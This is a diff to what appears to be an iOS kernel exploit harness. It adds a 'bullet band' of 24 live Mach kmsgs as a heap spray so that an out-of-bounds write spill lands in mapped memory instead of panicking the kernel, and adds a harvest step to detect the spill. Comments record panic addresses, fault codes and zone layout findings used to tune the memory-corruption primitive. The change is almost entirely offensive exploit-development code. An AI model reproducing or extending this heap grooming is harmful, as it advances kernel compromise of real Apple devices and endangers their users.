@@ -181,7 +181,7 @@
 #import <string.h>
 #import <unistd.h>
 
-#define P088_BUILD @"p088-write-hop-v16-bandintime"
+#define P088_BUILD @"p088-write-hop-v18-bullets"
 
 /* kernel-target tap: 0 = in-process T (safe-ish), 1 = kernel sid (PANIC) */
 #define P088_KERNEL_TARGET 0
@@ -249,6 +249,11 @@ typedef size_t (*p088_iosAllocSz_t)(IOSurfaceRef);
 typedef kern_return_t (*p088_iosLock_t)(IOSurfaceRef, uint32_t, uint32_t *);
 
 typedef struct { mach_port_t port; uint32_t index; BOOL alive; } p088_held_t;
+
+/* v18 mapped-neighbor bullet band: LIVE 0x820-class kmsgs held from tap end
+   to tear-down (never punched mid-round) */
+static p088_held_t p088_bullets[24];
+static uint32_t nBullets;
 
 typedef struct {
     IOSurfaceRef surf;
@@ -962,6 +967,34 @@ static NSString *p088_yfmt(double y) {
     p088_log(@"  persistent run: %u live kmsgs, indices 0x3000..0x%04x",
              nRun, 0x3000u + nRun - 1);
 
+    /* v18 mapped-neighbor bullets (12:12 panic, note 249): the fill walked
+       OUT of the mapped record area onto a page-aligned UNMAPPED boundary
+       (far 0xffffffe0d4bd4000, WnR=1 DFSC=7). Elements are 0xC00-strided,
+       5 per 16K page (v15 law); a page's last slot can border a
+       decommitted next page. Hold a dense band of LIVE 0x820-class kmsgs
+       (same zone machinery, never punched) from tap start: any spill past
+       the record chunk lands in a MAPPED live chunk instead of a
+       decommitted page -> no panic, and the spill is D2-harvestable
+       post-round via the bullet ports. Indices 0xB000-band (kept out of
+       run's 0x3000 and the mag prefill's 0x4D00). */
+    {
+        for (uint32_t i = 0; i < 24; i++) {
+            mach_port_t p = p088_make_port();
+            if (p == MACH_PORT_NULL) break;
+            p088_bullets[i].port = p;
+            p088_bullets[i].index = 0xB000u | i;
+            p088_bullets[i].alive = YES;
+            if (!p088_send_simple(p, p088_bullets[i].index)) {
+                mach_port_destroy(mach_task_self(), p);
+                p088_bullets[i].port = MACH_PORT_NULL;
+                break;
+            }
+            nBullets++;
+        }
+        p088_log(@"  [v18] bullet band: %u LIVE 0x820-class kmsgs held (mapped-neighbor prefill)",
+                 nBullets);
+    }
+
     /* v14 band pre-extension (v13 boots' lesson): r0's D2 census ran BEFORE
        the first [stage] scan, so fills carrying fresh-A staging sids
        (867..1631 tonight) misread FOREIGN against the model-load ceiling
@@ -1253,6 +1286,24 @@ static NSString *p088_yfmt(double y) {
     for (uint32_t i = 0; i < nRun; i++)
         if (run[i].port != MACH_PORT_NULL)
             mach_port_destroy(mach_task_self(), run[i].port);
+
+    /* v18 bullet-band harvest: any spill that landed in the bullet band
+       instead of the run shows up here as FILL HITs on the 0xB000 ports. */
+    {
+        uint32_t bHits = 0;
+        int bIdx = -1;
+        for (uint32_t i = 0; i < nBullets; i++) {
+            if (!p088_bullets[i].alive || p088_bullets[i].port == MACH_PORT_NULL) continue;
+            int hres = p088_harvest_one(&p088_bullets[i], "bullet");
+            if (hres < 0) {
+                bHits++;
+                if (bIdx < 0) bIdx = (int)i;
+            }
+        }
+        p088_log(@"  [v18] bullet harvest: %u hits (bands mapped but fill-hit); "
+                 @"first=bullet[%d]%s", bHits, bIdx,
+                 bHits ? @" -> SPILL CAUGHT IN MAPPED BAND (no panic)" : @"");
+    }
 
     /* ---- verdict ---- */
     p088_log(@"=== VERDICT ===");
